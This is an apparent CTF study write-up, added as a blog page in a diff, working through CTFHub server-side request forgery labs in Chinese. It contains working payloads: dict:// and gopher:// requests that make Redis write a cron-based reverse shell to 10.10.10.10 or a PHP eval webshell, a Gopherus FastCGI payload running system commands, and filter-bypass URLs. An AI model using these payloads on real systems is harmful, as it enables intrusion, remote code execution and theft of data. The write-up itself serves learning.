@@ -1,0 +1,247 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="syifna"><meta name="renderer" content="webkit"><meta name="copyright" content="syifna"><meta name="keywords" content="syifna~的博客"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>SSRF · syifna's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">syifna's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">SSRF</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2025-03-31</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。</p>
+<p>ssrf就是利用我们可以访问到的服务器，对其服务器下面的内网进行探测，也可以理解为服务器拥有外网ip，而我们要访问的电脑则是在公网ip进行nat后分配的内网ip</p>
+<p>在ctfhub上练习和学习了ssrf</p>
+<h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h4 id="【1】内网访问"><a href="#【1】内网访问" class="headerlink" title="【1】内网访问"></a>【1】内网访问</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20250404161254343.png" alt="image-20250404161254343"></p>
+<h4 id="【2】伪协议读取文件"><a href="#【2】伪协议读取文件" class="headerlink" title="【2】伪协议读取文件"></a>【2】伪协议读取文件</h4><p>SSRF利用的协议</p>
+<p>（1）file：在有回显的情况下，利用 file 协议可以读取任意内容</p>
+<p>访问文件系统总而获取文件，就是读取服务器本地文件，访问本地的静态资源</p>
+<p><code>file:///var/www/html/flag.php</code></p>
+<p>（2）dict：泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
+<p>获取服务器本机的redis信息。字典服务器协议，访问字典资源，能够引用允许通过DICT协议使用的定义或单词列表。如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：</p>
+<p>（3）gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p>
+<p>（4）http&#x2F;s：探测内网主机存活</p>
+<p><img src="/.io//image-20250404161324145.png" alt="image-20250404161324145"></p>
+<p>访问源码</p>
+<p><img src="/.io//image-20250404161352756.png" alt="image-20250404161352756"></p>
+<h4 id="【3】端口扫描"><a href="#【3】端口扫描" class="headerlink" title="【3】端口扫描"></a>【3】端口扫描</h4><p>1，有提示端口在8000~9000这个范围，所以尝试爆破</p>
+<p><img src="/.io//image-20250404161412815.png" alt="image-20250404161412815"></p>
+<p><img src="/.io//image-20250404161429536.png"></p>
+<p>2，直接访问，就能够得到flag</p>
+<p><code>知识点补充</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#### `\dic://协议数据格式 ：\`</span><br><span class="line"></span><br><span class="line">`一、dict协议探测端口和服务指纹`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:22`</span><br><span class="line"></span><br><span class="line">`dict://172.22.10.10:3306`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/info`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`二、dict协议攻击redis，写入定时任务，进行反弹shell`</span><br><span class="line"></span><br><span class="line">`centos系统定时任务的路径为：/var/spool/cron`</span><br><span class="line"></span><br><span class="line">`debian系统定时任务的路径为：/var/spool/cron/crontabs`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/config:set:dbfilename:root`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/config:set:dir:/var/spool/cron`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/set:test:&quot;\n\n/1     /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1\n\n&quot;`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/save`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`注意：若payload存在被转义或过滤的情况，可利用16进制写入内容`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/set:test:&quot;\n\n\x2a/1\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/10.10.10.10/1234\x200\x3e\x261\n\n&quot;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`三、dict协议攻击redis，写入webshell`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/config:set:dbfilename:test.php`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/config:set:dir:/var/www/html`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/set:test:&quot;\n\n&lt;?php @eval($_POST[x]);?&gt;\n\n&quot;`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/save`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`若存在过滤， 则利用16进制内容写入：`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/set:test:&quot;\n\n\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e\n\n&quot;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">四、dict协议攻击redis，写入ssh公钥</span><br><span class="line"></span><br><span class="line">操作和写入定时任务相似`</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="第二部分（Gopher协议的利用）"><a href="#第二部分（Gopher协议的利用）" class="headerlink" title="第二部分（Gopher协议的利用）"></a>第二部分（Gopher协议的利用）</h2><p>Gopher协议</p>
+<p> 1，gopher协议支持发出GET、POST请求：可以先拦截get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。</p>
+<p>利用gopher协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp 等，也可以发送 GET、POST 请求，这可以拓宽 SSRF 的攻击面</p>
+<h4 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h4><p>gopher:&#x2F;&#x2F;hostname(主机名或IP地址):port(端口号)&#x2F;请求方法(get、post等)&#x2F;path(路径)</p>
+<p>gopher:&#x2F;&#x2F;<host>:<port>&#x2F;<gopher-path>_后接tcp流</gopher-path></port></host></p>
+<p>例子：请求 Gopher 服务器上的 &#x2F;example&#x2F;file.txt 文本文件，可以使用以下 URL 格式：</p>
+<p>gopher:&#x2F;&#x2F;example.com:端口&#x2F;example&#x2F;file.txt</p>
+<p>3，在gopher协议中发送HTTP的数据的步骤：\构造HTTP数据包URL编码、替换回车换行为\%0d%0a\、发送gopher协议\</p>
+<h5 id><a href="#" class="headerlink" title></a><img src="/.io//image-20250404161531362.png" alt="image-20250404161531362"></h5><h6 id="4，-gopher的GET请求"><a href="#4，-gopher的GET请求" class="headerlink" title="4，\gopher的GET请求\"></a>4，\gopher的GET请求\</h6><p><img src="/.io//image-20250404161550689.png" alt="image-20250404161550689"></p>
+<p>例子：</p>
+<p>GET &#x2F;testg.php?name&#x3D;xxx HTTP&#x2F;1.1</p>
+<p>Host: 10.211.55.2</p>
+<h6 id="5，-gopher的POST请求："><a href="#5，-gopher的POST请求：" class="headerlink" title="5，\gopher的POST请求：\"></a>5，\gopher的POST请求：\</h6><p>\例如：\</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">key= 35f3958138b5a9da466bd0a976db21b8</span><br></pre></td></tr></table></figure>
+
+<p>需要包含这4个</p>
+<h6 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h6><ol>
+<li>问号（？）需要转码为URL编码，也就是%3f</li>
+<li>回车换行要变为%0d%0a,但如果直接用工具转，可能只有%0a</li>
+<li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li>
+<li>在gopher中默认端口为70</li>
+</ol>
+<h4 id="【1】POST请求"><a href="#【1】POST请求" class="headerlink" title="【1】POST请求"></a>【1】POST请求</h4><p>1,试试访问?url&#x3D;127.0.0.1&#x2F;flag.php</p>
+<p>查看源码</p>
+<p><img src="/.io//image-20250404161611372.png" alt="image-20250404161611372">2，用file协议查看文件?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
+<p>查看源码</p>
+<p><img src="/.io//image-20250404161629998.png" alt="image-20250404161629998">3，构造post请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">key= 35f3958138b5a9da466bd0a976db21b8</span><br></pre></td></tr></table></figure>
+
+<h4 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h4><ol start="5">
+<li>问号（？）需要转码为URL编码，也就是%3f</li>
+<li>回车换行要变为%0d%0a,但如果直接用工具转，可能只有%0a</li>
+<li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li>
+<li>在gopher中默认端口为70</li>
+</ol>
+<p>在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码。</p>
+<p>用在线工具url编码2次</p>
+<p>第一次编码后记得修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%20%0Akey=35f3958138b5a9da466bd0a976db21b8%0d%0a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20250404161656776.png" alt="image-20250404161656776">进行第2次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520127.0.0.1:80%250d%250AContent-Type:%2520application/x-www-form-urlencoded%250d%250AContent-Length:%252036%250d%250A%250d%250Akey=35f3958138b5a9da466bd0a976db21b8%250d%250a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20250404161714957.png" alt="image-20250404161714957"></p>
+<p>访问得到flag</p>
+<h4 id="【2】上传文件"><a href="#【2】上传文件" class="headerlink" title="【2】上传文件"></a>【2】上传文件</h4><p><a target="_blank" rel="noopener" href="http://challenge-1d2d783de061a7da.sandbox.ctfhub.com:10800/?url=_">challenge-1d2d783de061a7da.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;_</a></p>
+<p>按之前的题目同样访问一遍</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br><span class="line"></span><br><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>得到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">	echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">	return;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&quot;file&quot;]) &amp;&amp; $_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 0)&#123;</span><br><span class="line">	echo getenv(&quot;CTFHUB&quot;);</span><br><span class="line">	exit;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>1，\在from表单里提交按钮\</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20250404161743029.png" alt="image-20250404161743029"></p>
+<p>\2，用bp捕获，构造post请求\</p>
+<p><img src="/.io//image-20250404161758856.png" alt="image-20250404161758856"></p>
+<p>\我直接全部复制放在线工具里了\</p>
+<p>\2次url编码\</p>
+<p>\注意把%0A全部变成%0D%0A，得到\</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520challenge-1d2d783de061a7da.sandbox.ctfhub.com:10800%250D%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64;%2520rv:136.0)%2520Gecko/20100101%2520Firefox/136.0%250D%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,\/\;q=0.8%250D%250AAccept-Language:%2520zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%250D%250AAccept-Encoding:%2520gzip,%2520deflate,%2520br%250D%250AReferer:%2520http://challenge-1d2d783de061a7da.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php%250D%250AContent-Type:%2520multipart/form-data;%2520boundary=----geckoformboundary14b87f9c44b8ebc687cce1d9d4874719%250D%250AContent-Length:%2520340%250D%250AOrigin:%2520http://challenge-1d2d783de061a7da.sandbox.ctfhub.com:10800%250D%250AConnection:%2520keep-alive%250D%250AUpgrade-Insecure-Requests:%25201%250D%250APriority:%2520u=0,%2520i%250D%250A%250D%250A------geckoformboundary14b87f9c44b8ebc687cce1d9d4874719%250D%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%25221.txt%2522%250D%250AContent-Type:%2520text/plain%250D%250A%250D%250Assrf%2520upload%250D%250A------geckoformboundary14b87f9c44b8ebc687cce1d9d4874719%250D%250AContent-Disposition:%2520form-data;%2520name=%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%25AF%25A2%250D%250A------geckoformboundary14b87f9c44b8ebc687cce1d9d4874719--%250D%250A\</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h4 id="【3】FastCGI协议"><a href="#【3】FastCGI协议" class="headerlink" title="【3】FastCGI协议"></a>【3】FastCGI协议</h4><p>了解了协议原理</p>
+<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/mysteryflower/article/details/94386461">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写_flower未授权-CSDN博客</a></p>
+<p>fastcgi协议是服务器中间件和某个语言后端进行数据交换的协议</p>
+<p>数据包(TCP流)–&gt;Nginx(中间件）–&gt;FPM(fastcgi协议解析器)–&gt;FPM按照fastcgi的协议将TCP流解析成真正的数据</p>
+<p>1，用Gopherus脚本（构造特定的Gopher协议数据包）</p>
+<p>![kali p-2025-03-26-21-14-28](ssrf&#x2F;kali p-2025-03-26-21-14-28-1743755121643-2.png)</p>
+<p>![](C:\Users\27866\Desktop\kali p-2025-03-26-20-43-50.png</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH59%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3B%04%00%3C%3Fphp%20system%28%27cat%20/f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+<p>注意：进行编码时要去掉没有用的空格或者换行</p>
+<p>然后再进行2次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?url=</span><br><span class="line">gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F6%2506%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH59%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%253B%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Ff%252A%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h4 id="【4】Redis协议"><a href="#【4】Redis协议" class="headerlink" title="【4】Redis协议"></a>【4】Redis协议</h4><p>继续使用Gopherus脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit redis</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>二次url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure>
+
+<p>访问shell.php</p>
+<p>蚁剑连接，得到flag</p>
+<h2 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h2><h4 id="【1】URL-Bypass"><a href="#【1】URL-Bypass" class="headerlink" title="【1】URL Bypass"></a>【1】URL Bypass</h4><p>HTTP 基本身份认证绕过：</p>
+<p>​    HTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式。<br>​    也就是：<code>http://www.xxx.com@www.yyy.com</code>形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="【2】数字IP-Bypass"><a href="#【2】数字IP-Bypass" class="headerlink" title="【2】数字IP Bypass"></a>【2】数字IP Bypass</h4><p>使用上面的payload</p>
+<p>Ban ‘&#x2F;127|172|@&#x2F;‘</p>
+<p>进制绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">八进制：`0177.000.000.001`</span><br><span class="line">十进制：`127.0.0.1`</span><br><span class="line">十六进制：`0x7f000001`</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=0177.000.000.001/flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="【3】302跳转-Bypass"><a href="#【3】302跳转-Bypass" class="headerlink" title="【3】302跳转 Bypass"></a>【3】302跳转 Bypass</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
